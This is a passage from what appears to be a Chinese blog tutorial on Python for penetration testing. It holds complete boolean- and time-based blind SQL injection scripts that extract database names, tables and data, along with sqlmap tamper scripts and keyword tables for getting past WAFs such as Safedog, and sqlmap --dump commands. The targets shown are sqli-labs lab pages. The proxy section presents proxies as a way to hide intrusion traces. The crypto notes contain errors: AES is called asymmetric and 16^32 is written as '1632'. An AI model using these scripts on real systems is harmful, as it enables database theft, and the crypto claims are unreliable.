				if flag in res.content.decode("utf-8"):
					column += chr(c)
					print(column)
					break
		# 把获取到的名加入到DBColumns
		DBColumns.append(column)
		#清空column，用来继续获取下一个字段名
		column = ""


# 获取表数据函数
def GetDBData(url, dbtable, dbcolumn):
	global DBData
	# 先获取字段数据数量
	DBDataCount = 0
	print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
	for DBDataCount in range(99):
		payload = "'and if ((select count({0}) from {1})={2},1,0)  %23"
		targetUrl = url + payload
		res = conn.get(targetUrl.format(dbcolumn, dbtable, DBDataCount))
		if flag in res.content.decode("utf-8"):
			print("[-]{0}表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn, DBDataCount))
			break
	for a in range(0, DBDataCount):
		print("[-]正在获取{0}的第{1}个数据".format(dbcolumn, a+1))
		#先获取这个数据的长度
		dataLen = 0
		for dataLen in range(99):
			payload = "'and if ((select length({0}) from {1} limit {2},1)={3},1,0)  %23"
			targetUrl = url + payload
			res = conn.get(targetUrl.format(dbcolumn, dbtable, a, dataLen))
			if flag in res.content.decode("utf-8"):
				print("[-]第{0}个数据长度为:{1}".format(a+1, dataLen))
				break
		#临时存放数据内容变量
		data = ""
		#开始获取数据的具体内容
		#b表示当前数据内容猜解的位置
		for b in range(1, dataLen+1):
			for c in range(33, 128):
				payload = "'and if (ascii(substr((select {0} from {1} limit {2},1),{3},1))={4},1,0)  %23"
				targetUrl = url + payload
				res = conn.get(targetUrl.format(dbcolumn, dbtable, a, b, c))
				if flag in res.content.decode("utf-8"):
					data += chr(c)
					print(data)
					break
		#放到以字段名为键，值为列表的字典中存放
		DBData.setdefault(dbcolumn,[]).append(data)
		print(DBData)
		#把data清空来，继续获取下一个数据
		data = ""


if __name__ == '__main__':
	parser = optparse.OptionParser('usage: python %prog -u url \n\n'
									'Example: python %prog -u http://192.168.61.1/sql/Less-8/?id=1\n')
	# 目标URL参数-u
	parser.add_option('-u', '--url', dest='targetURL',default='http://127.0.0.1/sql/Less-8/?id=1', type='string',help='target URL')
	(options, args) = parser.parse_args()
	StartSqli(options.targetURL)
```
![](https://img-blog.csdnimg.cn/20201225202636129.png)
这个脚本建议多理解，多加变形，来满足各种要求(还是sqlmap舒服)
基于时间型SQL盲注检测：
```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import optparse
import time

# 存放数据库名变量
DBName = ""
# 存放数据库表变量
DBTables = []
# 存放数据库字段变量
DBColumns = []
# 存放数据字典变量,键为字段名，值为字段数据列表
DBData = {}

# 设置重连次数以及将连接改为短连接
# 防止因为HTTP连接数过多导致的 Max retries exceeded with url
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False


# 盲注主函数
def StartSqli(url):
	GetDBName(url)
	print("[+]当前数据库名:{0}".format(DBName))
	GetDBTables(url,DBName)
	print("[+]数据库{0}的表如下:".format(DBName))
	for item in range(len(DBTables)):
		print("(" + str(item + 1) + ")" + DBTables[item])
	tableIndex = int(input("[*]请输入要查看表的序号:")) - 1
	GetDBColumns(url,DBName,DBTables[tableIndex])
	while True:
		print("[+]数据表{0}的字段如下:".format(DBTables[tableIndex]))
		for item in range(len(DBColumns)):
			print("(" + str(item + 1) + ")" + DBColumns[item])
		columnIndex = int(input("[*]请输入要查看字段的序号(输入0退出):"))-1
		if(columnIndex == -1):
			break
		else:
			GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])


# 获取数据库名函数
def GetDBName(url):
	# 引用全局变量DBName,用来存放网页当前使用的数据库名
	global DBName
	print("[-]开始获取数据库名长度")
	# 保存数据库名长度变量
	DBNameLen = 0
	# 用于检查数据库名长度的payload
	payload = "' and if(length(database())={0},sleep(5),0) %23"
	# 把URL和payload进行拼接得到最终的请求URL
	targetUrl = url + payload
	# 用for循环来遍历请求，得到数据库名长度
	for DBNameLen in range(1, 99):
		# 开始时间
		timeStart = time.time()
		# 开始访问
		res = conn.get(targetUrl.format(DBNameLen))
		# 结束时间
		timeEnd = time.time()
		# 判断时间差
		if timeEnd - timeStart >= 5:
			print("[+]数据库名长度:" + str(DBNameLen))
			break
	print("[-]开始获取数据库名")
	payload = "' and if(ascii(substr(database(),{0},1))={1},sleep(5),0)%23"
	targetUrl = url + payload
	# a表示substr()函数的截取起始位置
	for a in range(1, DBNameLen+1):
		# b表示33~127位ASCII中可显示字符
		for b in range(33, 128):
			timeStart = time.time()
			res = conn.get(targetUrl.format(a,b))
			timeEnd = time.time()
			if timeEnd - timeStart >= 5:
				DBName += chr(b)
				print("[-]"+ DBName)
				break


#获取数据库表函数
def GetDBTables(url, dbname):
	global DBTables
	#存放数据库表数量的变量
	DBTableCount = 0
	print("[-]开始获取{0}数据库表数量:".format(dbname))
	#获取数据库表数量的payload
	payload = "' and if((select count(table_name) from information_schema.tables where table_schema='{0}' )={1},sleep(5),0) %23"
	targetUrl = url + payload
	#开始遍历获取数据库表的数量
	for DBTableCount in range(1, 99):
		timeStart = time.time()
		res = conn.get(targetUrl.format(dbname, DBTableCount))
		timeEnd = time.time()
		if timeEnd - timeStart >= 5:
			print("[+]{0}数据库的表数量为:{1}".format(dbname, DBTableCount))
			break
	print("[-]开始获取{0}数据库的表".format(dbname))
	# 遍历表名时临时存放表名长度变量
	tableLen = 0
	# a表示当前正在获取表的索引
	for a in range(0,DBTableCount):
		print("[-]正在获取第{0}个表名".format(a+1))
		# 先获取当前表名的长度
		for tableLen in range(1, 99):
			payload = "' and if((select length(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},sleep(5),0) %23"
			targetUrl = url + payload
			timeStart = time.time()
			res = conn.get(targetUrl.format(dbname, a, tableLen))
			timeEnd = time.time()
			if timeEnd - timeStart >= 5:
				break
		# 开始获取表名
		# 临时存放当前表名的变量
		table = ""
		# b表示当前表名猜解的位置
		for b in range(1, tableLen+1):
			payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},sleep(5),0)%23"
			targetUrl = url + payload
			# c表示33~127位ASCII中可显示字符
			for c in range(33, 128):
				timeStart = time.time()
				res = conn.get(targetUrl.format(dbname, a, b, c))
				timeEnd = time.time()
				if timeEnd - timeStart >= 5:
					table += chr(c)
					print(table)
					break
		#把获取到的名加入到DBTables
		DBTables.append(table)
		#清空table，用来继续获取下一个表名
		table = ""


# 获取数据库表的字段函数
def GetDBColumns(url, dbname, dbtable):
	global DBColumns
	# 存放字段数量的变量
	DBColumnCount = 0
	print("[-]开始获取{0}数据表的字段数:".format(dbtable))
	for DBColumnCount in range(99):
		payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},sleep(5),0) %23"
		targetUrl = url + payload
		timeStart = time.time()
		res = conn.get(targetUrl.format(dbname, dbtable, DBColumnCount))
		timeEnd = time.time()
		if timeEnd - timeStart >= 5:
			print("[-]{0}数据表的字段数为:{1}".format(dbtable, DBColumnCount))
			break
	# 开始获取字段的名称
	# 保存字段名的临时变量
	column = ""
	# a表示当前获取字段的索引
	for a in range(0, DBColumnCount):
		print("[-]正在获取第{0}个字段名".format(a+1))
		# 先获取字段的长度
		for columnLen in range(99):
			payload = "' and if((select length(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1)={3},sleep(5),0) %23"
			targetUrl = url + payload
			timeStart = time.time()
			res = conn.get(targetUrl.format(dbname, dbtable, a, columnLen))
			timeEnd = time.time()
			if timeEnd - timeStart >= 5:
				break
		# b表示当前字段名猜解的位置
		for b in range(1, columnLen+1):
			payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1),{3},1))={4},sleep(5),0) %23"
			targetUrl = url + payload
			# c表示33~127位ASCII中可显示字符
			for c in range(33, 128):
				timeStart = time.time()
				res = conn.get(targetUrl.format(dbname, dbtable, a, b, c))
				timeEnd = time.time()
				if timeEnd - timeStart >= 5:
					column += chr(c)
					print(column)
					break
		# 把获取到的名加入到DBColumns
		DBColumns.append(column)
		#清空column，用来继续获取下一个字段名
		column = ""


# 获取表数据函数
def GetDBData(url, dbtable, dbcolumn):
	global DBData
	# 先获取字段数据数量
	DBDataCount = 0
	print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
	for DBDataCount in range(99):
		payload = "' and if((select count({0}) from {1})={2},sleep(5),0) %23"
		targetUrl = url + payload
		timeStart = time.time()
		res = conn.get(targetUrl.format(dbcolumn, dbtable, DBDataCount))
		timeEnd = time.time()
		if timeEnd - timeStart >= 5:
			print("[-]{0}表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn, DBDataCount))
			break
	for a in range(0, DBDataCount):
		print("[-]正在获取{0}的第{1}个数据".format(dbcolumn, a+1))
		#先获取这个数据的长度
		dataLen = 0
		for dataLen in range(99):
			payload = "'and  if((select length({0}) from {1} limit {2},1)={3},sleep(5),0) %23"
			targetUrl = url + payload
			timeStart = time.time()
			res = conn.get(targetUrl.format(dbcolumn, dbtable, a, dataLen))
			timeEnd = time.time()
			if timeEnd - timeStart >= 5:
				print("[-]第{0}个数据长度为:{1}".format(a+1, dataLen))
				break
		#临时存放数据内容变量
		data = ""
		#开始获取数据的具体内容
		#b表示当前数据内容猜解的位置
		for b in range(1, dataLen+1):
			for c in range(33, 128):
				payload = "' and  if(ascii(substr((select {0} from {1} limit {2},1),{3},1))={4},sleep(5),0) %23"
				targetUrl = url + payload
				timeStart = time.time()
				res = conn.get(targetUrl.format(dbcolumn, dbtable, a, b, c))
				timeEnd = time.time()
				if timeEnd - timeStart >= 5:
					data += chr(c)
					print(data)
					break
		#放到以字段名为键，值为列表的字典中存放
		DBData.setdefault(dbcolumn,[]).append(data)
		print(DBData)
		#把data清空来，继续获取下一个数据
		data = ""


if __name__ == '__main__':
	parser = optparse.OptionParser('usage: python %prog -u url \n\n'
									'Example: python %prog -u http://192.168.61.1/sql/Less-9/?id=1\n')
	# 目标URL参数-u
	parser.add_option('-u', '--url', dest='targetURL',default='http://127.0.0.1/sql/Less-9/?id=1', type='string',help='target URL')
	(options, args) = parser.parse_args()
	StartSqli(options.targetURL)
```

### SQLMap的Tamper脚本
这个才是重点学习的！！！
>由于SQL注入的影响过于广泛以及人们的网络安全意识普遍提升，网站往往会针对SQL注入添加防SQL注入系统或者WAF。这时，在渗透测试过程中就需要绕过网站的安全防护系统。SQLMap是一款用来检测与利用SQL注入漏洞的免费开源工具，不仅可以实现SQL注入漏洞的检测与利用的自动化处理，而且其自带的Tamper脚本可以帮助我们绕过IDS/WAF的检测

|脚本名称|作用|
|-----|----|
|apostrophemask	|用其UTF-8全角字符替换`"'"`|
|apostrophenullencode |替换双引号为%00%27|
|appendnullbyte	|在有效载荷的末尾附加NULL字节字符(%00)|
|base64encode	|对给定有效载荷的所有字符进行Base64编码|
|between	|比较符替换为between|
|bluecoat	|用有效的随机空白字符替换SQL语句后的空格字符|
|chardoubleencode	|对有效载荷中的字符进行双重URL编码(处理未编码的字符)|
|charencode	|对有效载荷中的字符进行URL编码(不处理已经编码的字符)|
|charunicodeencode	|对有效载荷中的字符进行Unicode-URL编码|
|charunicodeescape	|对有效载荷中的未编码字符进行Unicode编码|
|commalesslimit	|改变limit语句的写法|
|commalessmid	|改变mid语句的写法|
|commentbeforeparentheses	|在括号前加内联注释|
|concat2concatws	|替换CONCAT为CONCAT_WS|
|equaltolike	|将`"="`替换为LIKE|
|escapequotes	|用斜杠转义单引号和双引号|
|greatest	|将大于号替换为greatest|
|halfversionedmorekeywords	|在每个关键字前加注释|
|hex2char|将0x开头的hex编码转换为使用CONCAT(CHAR())|
|htmlencode	|html编码所有非字母和数字的字符|
|ifnull2casewhenisnull	|改变ifnull语句的写法|
|ifnull2ifisnull	|替换ifnull为if(isnull(A))|
|informationschemacomment	|标识符后添加注释|
|least	|替换大于号为least|
|lowercase	|将每个关键字字符用小写字母替换|
|luanginx|绕过LUA-Nginx WAF|
|modsecurityversioned	|将空格替换为查询版本的注释|
|modsecurityzeroversioned	|添加完整的查询版本的注释|
|multiplespaces	|在SQL关键字周围添加多个空格|
|nonrecursivereplacement	|替换预定义的关键字|
|overlongutf8	|对有效载荷中非字母数字的字符转换为超长UTF-8编码|
|overlongutf8more	|对有效载荷中所有字符转换为超长UTF-8编码|
|percentage	|在每个字符前添加一个`"%"`|
|plus2concat	|将加号替换为concat函数|
|plus2fnconcat	|将加号替换为ODBC函数{fn CONCAT()}|
|randomcase	|对每个关键字符进行随机大小写替换|
|randomcomments	|对SQL关键字内添加随机内联注释|
|sp_password	|将有效载荷末尾附加函数`'sp_password'`，以便从DBMS日志中自动进行混淆|
|space2comment	|将空格字符替换为`"/**/"`|
|space2dash	|将空格字符替换为`"–-"`，并添加一个随机字符串和换行符|
|space2hash	|将空格字符替换为`"#"`，并添加一个随机字符串和换行符|
|space2morecomment	|将空格字符替换为`"/**_**/"`|
|space2morehash	|将空格字符替换为`"#"`，并添加一个随机字符串和换行符|
|space2mssqlblank	|将空格字符随机替换为其他空格符号|
|space2mssqlhash	|将空格替换为`"#"`并添加换行|
|space2mysqlblank	|用有效字符集中的随机空白字符替换空格字符|
|space2mysqldash	|将空格字符替换为`"-"`并添加换行|
|space2plus	|用加号替换空格|
|space2randomblank	|将空格替换为备选字符集中的随机空白字符|
|substring2leftright|将substring函数用left right函数代替|
|symboliclogical	|AND和OR替换为&&和&#124;&#124;|
|unionalltounion	|将union all select替换为union select|
|unmagicquotes	|宽字符绕过GPC|
|uppercase	|将关键字符进行大写替换|
|varnish	|添加HTTP标头X-originating-IP来绕过Varnish防火墙|
|versionedkeywords	|用版本注释将每个非功能性关键字括起来|
|versionedmorekeywords	|将每个关键字用版本注释绕过|
|xforwardedfor	|添加伪造的HTTP标头X-Forwarded-For|

[SqlMap 1.2.7.20 Tamper详解及使用指南](https://www.freebuf.com/sectool/179035.html)

这里以sqli-labs的26关来进行，查看一下过滤函数，发现过滤了:`or`,`and`,`/*`,`--`,`#`,空格和斜杠(**注意这里php环境是5.2.17，版本不一样会有问题**)
```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```
发现可以双写绕过and和or，`%a0`可以绕过空格
双写绕过脚本double-and-or.py：
```python
#!/usr/bin/env python
# -*- coding:UTF-8 -*-

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
# 导入正则模块，用于字符的替换
import re
# sqlmap中lib\core\enums中的PRIORITY优先级函数
from lib.core.enums import PRIORITY
# 定义脚本优先级
__priority__ = PRIORITY.NORMAL

# 脚本描述函数
def dependencies():
    pass

def tamper(payload, **kwargs):
    # 将payload进行转存
    retVal = payload
    if payload:
        # 使用re.sub函数不区分大小写替换and和or
        # 替换为anandd和oorr
        retVal = re.sub(r"(?i)(or)", r"oorr", retVal)
        retVal = re.sub(r"(?i)(and)", r"anandd", retVal)
    # 把最后修改好的payload返回
    return retVal
```
第二个空格替换脚本space2A0.py：
```python
#!/usr/bin/env python
# -*- coding:UTF-8 -*-

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW


def dependencies():
    pass


def tamper(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    # 把原先的+改为%a0即可
                    retVal += "%a0"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                # 把原先的+改为%a0即可
                retVal += "%a0"
                continue

            retVal += payload[i]

    return retVal
```
直接使用sqlmap发现是无法进行注入的，这里添加`--tamper`，并添加`-v 3`来查看输出的payload
`python3 sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-26/?id=1 --tamper "double-and-or.py,space2A0.py" -v 3 --batch`
![](https://img-blog.csdnimg.cn/20201229124402202.png)
发现Pyload中使用了`count(*)`，出现了关键字`*`，需要通过count(常数)来代替`count(*)`，count.py：
```python
#!/usr/bin/env python
# -*- coding:UTF-8 -*-
"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
		# 把count(*)替换为count(1)
        retVal = re.sub(r"(?i)count\(\*\)", r"count(1)", payload)

    return retVal
```
最后执行即可绕过过滤
`python3 sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-26/?id=1 --tamper "double-and-or.py,space2A0.py,count.py" -D security -T users -C "username,password" --dump -v 3 --batch`
![](https://img-blog.csdnimg.cn/20201229125734222.png)

### 绕过安全狗
|被过滤的关键字|			绕过方法|
|----|----|
|空格 		|			`/*!*/`|
|=					|	`/*!*/=/*!*/`|
|AND					|	`/*!*/AND/*!*/`|
|UNION			|		`union/*!88888cas*/`|
|#				|		`/*!*/#`|
|USER() 		|			`USER/*!()*/`|
|DATABASE()		|		`DATABASE/*!()*/`|
|--				|		`/*!*/--`|
|SELECT			|		`/!88888cas*/select`|
|FROM 				|	`/*!99999c*//*!99999c*/from`|

编写一个Tamper脚本：
```python
#!/usr/bin/env python

from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING

__priority__ = PRIORITY.NORMAL

def dependencies():
	pass

def tamper(payload, **kwargs):
	if payload:
		payload = payload.replace("UNION","union/*!88888cas*/")
		payload = payload.replace("--","/*!*/--")
		payload = payload.replace("SELECT","/*!88888cas*/select")
		payload = payload.replace("FROM","/*!99999c*//*!99999c*/from")
		payload = payload.replace("#","/*!*/#")
		payload = payload.replace("USER()","USER/*!()*/")
		payload = payload.replace("DATABASE()","DATABASE/*!()*/")
		payload = payload.replace(" ","/*!*/")
		payload = payload.replace("=","/*!*/=/*!*/")
		payload = payload.replace("AND","/*!*/AND/*!*/")

	return payload
```
### 网络代理
网络代理的用途广泛，常用于代理爬虫，代理VPN，代理注入等。使用网络代理能够将入侵痕迹进一步减少，能够突破自身IP的访问限制，提高访问速度，以及隐藏真实IP，还能起到一定的防止攻击的作用。
Python的代理有多种用法，本节介绍常见的几种：Urllib代理、requests代理
[泥马ip代理官网](http://www.nimadaili.com/)
Urllib代理的设置包括设置代理的地址和端口，访问测试的网址进行测试，会返回访问的IP地址，如果返回的IP是代理IP，则说明是通过代理访问的
```python
from urllib.error import URLError
from urllib.request import ProxyHandler,build_opener

proxy='185.127.126.222:80'  #代理地址
#proxy='username:password@IP:port'
proxy_handler=ProxyHandler({
    'http':'http://'+proxy,
    'https':'https://'+proxy
})
opener=build_opener(proxy_handler)
try:
    response = opener.open('http://httpbin.org/get') #测试ip的网址
    print(response.read().decode('utf-8'))
except URLError as e:
    print(e.reason)
```
![](https://img-blog.csdnimg.cn/2020122917544098.png)
requests代理设置包括设置代理的IP地址和端口，访问测试页面，通过测试页面的返回值判断是否为通过代理访问
```python
import requests

proxy='185.114.137.14:185'  #代理地址
proxies={
    'http':'http://'+proxy,
    'https':'https://'+proxy
}
try:
    response=requests.get('http://httpbin.org/get',proxies=proxies)
    print(response.text)
except requests.exceptions.ConnectionError as e:
    print('error:',e.args)
```
![](https://img-blog.csdnimg.cn/20201229175756887.png)

## 数据加密
[常见对称加密算法](https://www.cnblogs.com/Terry-Wu/p/10314315.html)
[非对称加密算法-RSA算法](https://www.cnblogs.com/xtiger/p/10972373.html)
[加解密篇 - 非对称加密算法 (RSA、DSA、ECC、DH)](https://blog.csdn.net/u014294681/article/details/86705999)
首先需要安装`pip3 install pycryptodome`，PyCryptodome是Python中一种强大的加密算法库，可以实现常见的单项加密、对称加密、非对称加密和流加密算法
### Base64编/解码
[Base64基本原理及简单应用](https://segmentfault.com/a/1190000012654771)
[在线加密解密-base64](https://tool.oschina.net/encrypt?type=3)
>在参数传输的过程中经常遇到的一种情况：使用全英文的没问题，但一旦涉及到中文就会出现乱码情况。与此类似，网络上传输的字符并不全是可打印的字符，比如二进制文件、图片等。Base64的出现就是为了解决此问题，它是基于64个可打印的字符来表示二进制的数据的一种方法。

从严格意义上来说，Base64编码算法并不算是加密算法，Base64编码只是将源数据转码为一种不易阅读的形式，而转码的规则是公开的。
Base64编码方式：
```python
import base64
# base64编码
s1 = 'bmth666'
a = base64.b64encode(s1.encode("utf-8"))
print(a)

# base64解码
s2 = 'Ym10aDY2Ng=='
b = str(base64.b64decode(s2),"utf-8")
print(b)
```
![](https://img-blog.csdnimg.cn/20201229203748447.png)
### DES加密算法
[加密算法------DES加密算法详解](https://blog.csdn.net/m0_37962600/article/details/79912654)
[数据加密算法--详解DES加密算法原理与实现](https://www.cnblogs.com/idreamo/p/9333753.html)
[在线DES加密|DES解密](https://www.sojson.com/encrypt_des.html)
[在线DES加密解密](http://www.metools.info/code/c19.html)
>DES加密算法综合运用了置换、替换、代数等多种密码技术，具有设计精巧、实现容易、使用方便等特点。DES加密算法的明文、密文和密钥的分组长度都是64位

通过Cryptodome库函数实现对字符串进行DES加密。由于DES为分组密码的加密方式，其工作模式有5种：ECB、CBC、CTR、CFB、OFB。
```python
from Crypto.Cipher import DES
import binascii

# 这是密钥
key = b'abcdefgh'   # key需为8字节长度.
# 需要去生成一个DES对象
des = DES.new(key, DES.MODE_ECB)
# 需要加密的数据
text = 'ms08067.com'     # 被加密的数据需要为8字节的倍数.
text = text + (8 - (len(text) % 8)) * '='
print(text)
# 加密的过程
encrypto_text = des.encrypt(text.encode())
encryptResult = binascii.b2a_hex(encrypto_text)
print(encryptResult)

encrypto_text = binascii.a2b_hex(encryptResult)
decryptResult = des.decrypt(encrypto_text)
#decrrpto_text = binascii.b2a_hex(decrrpto_text)
print(decryptResult)
```
![](https://img-blog.csdnimg.cn/20201229205616999.png)

>DES加密方式存在许多安全问题。例如，密钥较短可被穷举攻击，存在弱密钥和半弱密钥等。因此，美国NIST在1999年发布了一个新版本的DES标准3DES。3DES加密算法的密钥长度为168位，能够抵抗穷举攻击，并且3DES底层加密算法与DES相同，许多现有的DES软硬件产品都能方便地实现3DES，因此在使用上也较为方便

### AES加密算法
[AES加密算法的详细介绍与实现](https://blog.csdn.net/qq_28205153/article/details/55798628)
[AES算法分析与实现](https://www.cnblogs.com/lancidie/archive/2013/03/16/2963473.html)
[AES算法简介](https://www.cnblogs.com/OneFri/p/5924605.html)

>AES是一个迭代的、分组密码加密方式，可以使用128、192、256位密钥。与公共密钥密码使用密钥对不同，对称密钥密码使用相同的密钥加密和解密数据。通过分组密码返回的加密数据的位数与输入数据相同。迭代加密使用一个循环结构，在该循环中重复置换和替换输入数据，加之算法本身复杂的加密过程，使得该算法成为数据加密领域的主流。

```python
from Crypto.Cipher import AES
import binascii

# 这是密钥
key = b'abcdefghabcdefgh'   # key需为8字节长度.
# 需要加密的数据
text = 'ms08067.com'     # 被加密的数据需要为8字节的倍数.
text = text + (16 - (len(text) % 16)) * '='
print(text)
# 需要去生成一个DES对象
aes = AES.new(key, AES.MODE_ECB)
encrypto_text = aes.encrypt(text.encode())
encryptResult = binascii.b2a_hex(encrypto_text)
print(encryptResult)

encrypto_text = binascii.a2b_hex(encryptResult)
decryptResult = aes.decrypt(encrypto_text)
#decrrpto_text = binascii.b2a_hex(decrrpto_text)
print(decryptResult)
```
![](https://img-blog.csdnimg.cn/20201229211602204.png)
>AES密码是一个非对称密码体制，它的解密要比加密复杂和费时。解密优化算法在没有增加储存空间的基础上，以列变化为基础进行处理，节约了处理时间。AES是高级数据加密算法，无论安全性、效率，还是密钥的灵活性等方面，都优于DES数据加密算法

### MD5加密算法
[MD5算法原理与实现](https://blog.csdn.net/xiaofengcanyuexj/article/details/37698801)
[ md5加密原理简单解释](https://www.cnblogs.com/second-tomorrow/p/9129043.html)
[MD5免费在线解密破解](https://www.somd5.com/)
[md5解密](https://pmd5.com/)
[md5在线解密破解](https://www.cmd5.com/)
>该算法不仅能对信息管理系统加密，还广泛应用于计算机、数据安全传输、数字签名认证等安全领域。由于该算法具有某些不可逆特征，在加密应用上有较好的安全性

用Python实现MD5加密时用到的是hashlib模块，可以通过hashlib标准库使用多种Hash算法，如SHA1、SHA224、SHA256、SHA384、SHA512和MD5算法等
```python
from hashlib import md5

def encrypt_md5(msg):
    new_md5 = md5()
    new_md5.update(msg.encode(encoding='utf-8'))
    return new_md5.hexdigest()

if __name__ == '__main__':
    print(encrypt_md5('bmth666'))
```
![](https://img-blog.csdnimg.cn/20201229212918610.png)
>虽然MD5为单向Hash加密，且不可逆，但根据鸽巢原理，MD5算法所产生的32位输出所能够表示的空间大小为1632，即当样本大于1632时就会产生Hash碰撞。由这一结论可知，我们可以生成大量密码样本的Hash，得到密码和Hash值一一对应关系，然后根据这个对应关系反查，就可以得到Hash值所对应的密码。在互联网应用方面，有相当多的用户使用弱密码，因此可以根据统计规律建立简单密码所对应的MD5值表，从而得到使用简单密码的用户账户。
鉴于存在以上安全性问题，可以在用户密码被创建时生成一个随机字符串(称之为Salt)与用户口令连接在一起，然后再用散列函数对这个字符串进行MD5加密。如果Salt值的数目足够大，它实际上就消除了对常用口令采用的字典式破解，因为攻击者不可能在数据库中存储那么多Salt和用户密码组合后的MD5值

md5强碰撞：
[如何用不同的数值构建一样的MD5 - 第二届强网杯 MD5碰撞 writeup](https://xz.aliyun.com/t/2232)
[https://github.com/mythkiven/SHAttered](https://github.com/mythkiven/SHAttered)
[https://www.win.tue.nl/hashclash](https://www.win.tue.nl/hashclash/)